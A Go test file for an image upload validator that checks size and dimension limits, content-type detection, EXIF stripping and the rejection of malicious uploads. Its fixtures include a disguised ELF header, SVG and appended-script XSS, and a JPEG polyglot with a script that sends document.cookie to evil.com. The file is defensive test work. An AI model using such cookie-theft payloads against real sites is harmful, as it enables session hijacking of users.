package assets

import (
	"bytes"
	"image"
	"image/color"
	"image/png"
	"testing"
)

func TestImageValidator_SecurityIntegration_CompleteFlow(t *testing.T) {
	validator := NewImageValidator()

	t.Run("valid image passes all checks", func(t *testing.T) {
		data := createTestJPEG(t, 800, 600)

		result, err := validator.Validate(data)
		if err != nil {
			t.Fatalf("Valid image should pass validation: %v", err)
		}

		if result.ContentType != "image/jpeg" {
			t.Errorf("ContentType = %v, want image/jpeg", result.ContentType)
		}
		if result.Width != 800 || result.Height != 600 {
			t.Errorf("Dimensions = %dx%d, want 800x600", result.Width, result.Height)
		}
	})

	t.Run("malicious file fails all checks", func(t *testing.T) {
		maliciousFiles := []struct {
			name string
			data []byte
		}{
			{
				name: "executable with image extension",
				data: []byte{0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00},
			},
			{
				name: "SVG with XSS",
				data: []byte(`<svg><script>alert('XSS')</script></svg>`),
			},
			{
				name: "image with embedded script",
				data: append(createTestJPEG(t, 100, 100), []byte("<script>alert(1)</script>")...),
			},
		}

		for _, mf := range maliciousFiles {
			t.Run(mf.name, func(t *testing.T) {
				_, err := validator.Validate(mf.data)
				if err == nil {
					t.Errorf("Malicious file should be rejected: %s", mf.name)
				}
			})
		}
	})

	t.Run("oversized files are rejected", func(t *testing.T) {
		data := createTestJPEG(t, 100, 100)
		oversized := make([]byte, 6*1024*1024)
		copy(oversized, data)

		_, err := validator.Validate(oversized)
		if err == nil {
			t.Error("Oversized file should be rejected")
		}
	})

	t.Run("oversized dimensions are rejected", func(t *testing.T) {
		data := createTestJPEG(t, 5000, 5000)

		_, err := validator.Validate(data)
		if err == nil {
			t.Error("Oversized dimensions should be rejected")
		}
	})
}

func TestStripEXIF_SecurityIntegration(t *testing.T) {
	t.Run("EXIF stripping preserves image but removes metadata", func(t *testing.T) {
		originalData := createTestJPEG(t, 400, 300)

		stripped, err := stripEXIF(originalData, "jpeg")
		if err != nil {
			t.Fatalf("stripEXIF() error = %v", err)
		}

		img, format, err := image.Decode(bytes.NewReader(stripped))
		if err != nil {
			t.Fatalf("Stripped image is not valid: %v", err)
		}

		if format != "jpeg" {
			t.Errorf("Format = %v, want jpeg", format)
		}

		bounds := img.Bounds()
		if bounds.Dx() != 400 || bounds.Dy() != 300 {
			t.Errorf("Dimensions = %dx%d, want 400x300", bounds.Dx(), bounds.Dy())
		}

		if len(stripped) == 0 {
			t.Error("Stripped image should not be empty")
		}
	})

	t.Run("multiple format EXIF stripping", func(t *testing.T) {
		formats := []struct {
			name   string
			format string
			create func(t *testing.T, w, h int) []byte
		}{
			{"JPEG", "jpeg", createTestJPEG},
			{"PNG", "png", createTestPNG},
			{"GIF", "gif", createTestGIF},
		}

		for _, f := range formats {
			t.Run(f.name, func(t *testing.T) {
				original := f.create(t, 200, 150)

				stripped, err := stripEXIF(original, f.format)
				if err != nil {
					t.Fatalf("stripEXIF() error = %v", err)
				}

				img, _, err := image.Decode(bytes.NewReader(stripped))
				if err != nil {
					t.Fatalf("Stripped image is not valid: %v", err)
				}

				bounds := img.Bounds()
				if bounds.Dx() != 200 || bounds.Dy() != 150 {
					t.Errorf("Dimensions changed: %dx%d, want 200x150", bounds.Dx(), bounds.Dy())
				}
			})
		}
	})
}

func TestImageValidator_SecurityIntegration_RealWorldScenarios(t *testing.T) {
	validator := NewImageValidator()

	t.Run("user uploads profile photo", func(t *testing.T) {
		photo := createTestJPEG(t, 1024, 768)

		result, err := validator.Validate(photo)
		if err != nil {
			t.Fatalf("Valid profile photo should pass: %v", err)
		}

		stripped, err := stripEXIF(photo, result.Format)
		if err != nil {
			t.Fatalf("EXIF stripping should succeed: %v", err)
		}

		if len(stripped) == 0 {
			t.Error("Stripped photo should not be empty")
		}
	})

	t.Run("attacker uploads malicious polyglot", func(t *testing.T) {
		jpegHeader := []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46}
		maliciousPayload := []byte(`<script>fetch('http://evil.com/steal?data='+document.cookie)</script>`)
		polyglot := append(jpegHeader, maliciousPayload...)

		_, err := validator.Validate(polyglot)
		if err == nil {
			t.Error("Polyglot file with script should be rejected")
		}
	})

	t.Run("attacker uploads renamed executable", func(t *testing.T) {
		executable := []byte{0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00}

		_, err := validator.Validate(executable)
		if err == nil {
			t.Error("Executable should be rejected regardless of filename")
		}
	})

	t.Run("user uploads very large image", func(t *testing.T) {
		largeImage := createTestJPEG(t, 4096, 4096)

		result, err := validator.Validate(largeImage)
		if err != nil {
			t.Fatalf("4096x4096 image should be allowed: %v", err)
		}

		if result.Width != 4096 || result.Height != 4096 {
			t.Errorf("Dimensions = %dx%d, want 4096x4096", result.Width, result.Height)
		}
	})

	t.Run("user uploads slightly oversized image", func(t *testing.T) {
		oversized := createTestJPEG(t, 4097, 100)

		_, err := validator.Validate(oversized)
		if err == nil {
			t.Error("4097px width should be rejected")
		}
	})
}

func TestImageValidator_SecurityIntegration_ContentTypeValidation(t *testing.T) {
	validator := NewImageValidator()

	t.Run("content type matches magic bytes", func(t *testing.T) {
		tests := []struct {
			name       string
			data       []byte
			wantType   string
			wantFormat string
		}{
			{
				name:       "JPEG",
				data:       createTestJPEG(t, 100, 100),
				wantType:   "image/jpeg",
				wantFormat: "jpeg",
			},
			{
				name:       "PNG",
				data:       createTestPNG(t, 100, 100),
				wantType:   "image/png",
				wantFormat: "png",
			},
			{
				name:       "GIF",
				data:       createTestGIF(t, 100, 100),
				wantType:   "image/gif",
				wantFormat: "gif",
			},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				result, err := validator.Validate(tt.data)
				if err != nil {
					t.Fatalf("Valid %s should pass: %v", tt.name, err)
				}

				if result.ContentType != tt.wantType {
					t.Errorf("ContentType = %v, want %v", result.ContentType, tt.wantType)
				}
				if result.Format != tt.wantFormat {
					t.Errorf("Format = %v, want %v", result.Format, tt.wantFormat)
				}
			})
		}
	})

	t.Run("mismatched content type is rejected", func(t *testing.T) {
		textFile := []byte("This is text, not an image")

		_, err := validator.Validate(textFile)
		if err == nil {
			t.Error("Text file should be rejected")
		}
	})
}

func TestImageValidator_SecurityIntegration_BoundaryValidation(t *testing.T) {
	validator := NewImageValidator()

	t.Run("exactly at limits should pass", func(t *testing.T) {
		data := createTestJPEG(t, 4096, 4096)

		if int64(len(data)) > 5*1024*1024 {
			data = data[:5*1024*1024]
		}

		_, err := validator.Validate(data)
		if err != nil {
			t.Errorf("Image at exact limits should pass: %v", err)
		}
	})

	t.Run("one byte over size limit should fail", func(t *testing.T) {
		data := createTestJPEG(t, 100, 100)
		oversized := make([]byte, 5*1024*1024+1)
		copy(oversized, data)

		_, err := validator.Validate(oversized)
		if err == nil {
			t.Error("Image one byte over limit should fail")
		}
	})

	t.Run("one pixel over dimension limit should fail", func(t *testing.T) {
		data := createTestJPEG(t, 4097, 100)

		_, err := validator.Validate(data)
		if err == nil {
			t.Error("Image one pixel over width limit should fail")
		}
	})
}

func createTestImageWithColor(t *testing.T, width, height int, c color.Color) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, width, height))
	for y := 0; y < height; y++ {
		for x := 0; x < width; x++ {
			img.Set(x, y, c)
		}
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		t.Fatalf("Failed to create test image: %v", err)
	}
	return buf.Bytes()
}
